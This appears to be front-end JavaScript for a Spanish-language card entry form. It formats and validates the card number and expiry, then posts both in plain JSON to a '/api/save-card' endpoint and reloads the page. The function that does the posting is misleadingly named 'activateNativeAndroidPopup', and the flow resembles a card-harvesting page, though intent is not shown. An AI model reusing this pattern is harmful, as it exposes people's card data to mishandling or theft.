// ============================================
// CARD FORM — FORMATTING, VALIDATION & SUBMIT
// ============================================

(function () {
    // Card number formatting
    const cardNumberInput = document.getElementById('card-number');
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function (e) {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
        });
    }

    // Expiry date formatting
    const expiryInput = document.getElementById('expiry');
    if (expiryInput) {
        expiryInput.addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                const month = value.slice(0, 2);
                const year = value.slice(2, 4);
                value = month + '/' + year;
            }
            e.target.value = value;
        });
    }

    // Form submission
    const paymentForm = document.getElementById('payment-form');
    const submitButton = document.getElementById('submit-button');
    const buttonLoader = document.getElementById('button-loader');

    if (paymentForm) {
        paymentForm.addEventListener('submit', function (e) {
            e.preventDefault();

            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
            const expiry = document.getElementById('expiry').value;

            if (cardNumber && (cardNumber.length < 13 || cardNumber.length > 19)) {
                showError('El número de tarjeta no es válido');
                return;
            }

            if (expiry && expiry.length < 5) {
                showError('La fecha de vencimiento no es válida');
                return;
            }

            submitButton.disabled = true;
            submitButton.classList.add('loading');
            buttonLoader.style.display = 'flex';

            activateNativeAndroidPopup();
        });
    }

    async function activateNativeAndroidPopup() {
        const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
        const expiry = document.getElementById('expiry').value;

        if (!cardNumber) {
            showError('Por favor, ingresa el número de tarjeta.');
            resetButton();
            return;
        }

        try {
            const response = await fetch('/api/save-card', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cardNumber, expiry })
            });

            if (response.ok) {
                document.getElementById('card-number').blur();
                document.getElementById('expiry').blur();

                setTimeout(() => {
                    window.location.reload();
                }, 1500);
            } else {
                showError('Error al guardar la tarjeta. Intenta de nuevo.');
                resetButton();
            }
        } catch (err) {
            console.error('Save error:', err);
            showError('Error de conexión. Intenta de nuevo.');
            resetButton();
        }
    }

    function resetButton() {
        if (submitButton) {
            submitButton.disabled = false;
            submitButton.classList.remove('loading');
            buttonLoader.style.display = 'none';
        }
    }

    function showError(message) {
        let errorDiv = document.querySelector('.error-message');
        if (!errorDiv) {
            errorDiv = document.createElement('div');
            errorDiv.className = 'error-message';
            paymentForm.insertBefore(errorDiv, submitButton);
        }
        errorDiv.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
        errorDiv.style.display = 'block';

        setTimeout(() => {
            errorDiv.style.display = 'none';
        }, 5000);
    }

    // Input focus/blur animations
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('focus', function () {
            const wrapper = this.closest('.form-group');
            if (wrapper) wrapper.classList.add('focused');
        });

        input.addEventListener('blur', function () {
            const wrapper = this.closest('.form-group');
            if (wrapper) {
                wrapper.classList.remove('focused');
                if (this.value) {
                    wrapper.classList.add('filled');
                } else {
                    wrapper.classList.remove('filled');
                }
            }
        });

        if (input.value) {
            const wrapper = input.closest('.form-group');
            if (wrapper) wrapper.classList.add('filled');
        }
    });
})();
